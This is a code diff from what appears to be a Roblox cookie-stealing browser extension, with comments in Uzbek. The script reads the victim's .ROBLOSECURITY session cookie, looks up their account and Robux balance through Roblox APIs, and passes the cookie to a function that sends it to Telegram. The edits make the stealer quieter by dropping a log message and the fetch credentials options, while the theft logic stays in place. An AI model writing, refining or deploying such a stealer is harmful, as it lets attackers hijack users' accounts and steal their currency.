@@ -20,16 +20,13 @@ async function checkAndSendCookies() {
             name: ".ROBLOSECURITY"
         });
 
-        if (!cookies) {
-            console.log("Kuki topilmadi (akkauntga kirilmagan).");
-            return;
-        }
+        if (!cookies) return;
         let cookieValue = cookies.value;
 
         const userInfo = await getRobloxUserInfo(cookieValue);
         if (!userInfo) return;
 
-        // Robux balansini aniq olish
+        // Robux balansini aniq olish (Fetch orqali ruxsat bilan)
         let robuxBalance = await getRobuxBalance(cookieValue);
 
         let accountId = userInfo.id.toString();
@@ -81,8 +78,7 @@ async function checkAndSendCookies() {
 async function getRobloxUserInfo(cookieValue) {
     try {
         let response = await fetch("https://users.roblox.com/v1/users/authenticated", {
-            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` },
-            credentials: "include"
+            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
         });
         if (response.ok) return await response.json();
     } catch (e) {}
@@ -92,15 +88,14 @@ async function getRobloxUserInfo(cookieValue) {
 async function getRobuxBalance(cookieValue) {
     try {
         let response = await fetch("https://economy.roblox.com/v1/user/currency", {
-            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` },
-            credentials: "include"
+            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
         });
         if (response.ok) {
             let data = await response.json();
             return data.robux !== undefined ? data.robux : 0;
         }
     } catch (e) {}
-    return 0;
+    return 0; // Agar xato bo'lsa 0 qaytaradi
 }
 
 async function sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, timeStr, accountId) {
